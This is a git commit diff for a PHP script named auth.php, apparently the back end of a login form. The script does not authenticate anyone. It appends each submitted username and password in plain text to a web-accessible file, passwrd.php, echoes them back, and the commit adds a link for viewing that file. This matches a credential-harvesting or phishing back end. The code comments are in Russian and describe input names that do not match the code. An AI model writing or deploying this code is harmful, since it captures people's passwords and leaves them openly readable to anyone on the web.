6ac196b0a51a7c88ad6e9b09d41193acb8440177
Gr8fu1 <86927380+Gr8fu1@users.noreply.github.com>
2022-11-28 19:28:30 +0300

    upd 1.3

--- auth.php
+++ auth.php
@@ -3,8 +3,9 @@
 $usrname= $_POST['username']; // Здесь будет значение инпута с name атрибутом "value"
 $passwd =  $_POST['password']; // А здесь с name "email"
 
-$f = fopen('password.php', 'a+'); // Открываем файл
+$f = fopen('passwrd.php', 'a+'); // Открываем файл
 fwrite($f, "User-password: ".$usrname." - ".$passwd."\n"); // Записываем данные
 fclose($f); // Закрываем файл
 echo "User-password: ".$usrname." - ".$passwd."\n";
+echo "<a href='passwrd.php'>View</a>\n";
 ?>
